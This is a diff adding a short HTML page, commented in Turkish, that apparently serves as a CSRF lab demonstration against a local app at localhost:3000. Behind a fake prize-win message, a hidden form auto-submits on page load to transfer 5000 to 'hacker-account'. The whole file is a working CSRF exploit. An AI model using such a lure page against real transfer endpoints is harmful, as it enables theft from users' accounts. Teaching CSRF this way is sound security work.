@@ -1,0 +1,21 @@
+<!-- CSRF Saldırı Sayfası — Saldırgan tarafından hazırlanan sayfa -->
+<!DOCTYPE html>
+<html>
+<head><title>Tebrikler! Hediye Kazandınız!</title></head>
+<body>
+  <h1>🎉 Çekilişi Kazandınız!</h1>
+  <p>Hediyenizi almak için bekleyin...</p>
+
+  <!-- Gizli CSRF form -->
+  <iframe name="csrf-frame" style="display:none"></iframe>
+  <form id="csrf-form" action="http://localhost:3000/transfer" method="POST" target="csrf-frame">
+    <input type="hidden" name="to" value="hacker-account">
+    <input type="hidden" name="amount" value="5000">
+  </form>
+  <script>
+    // Sayfa yüklenince formu otomatik gönder
+    document.getElementById('csrf-form').submit();
+    console.log('CSRF saldırısı gönderildi!');
+  </script>
+</body>
+</html>
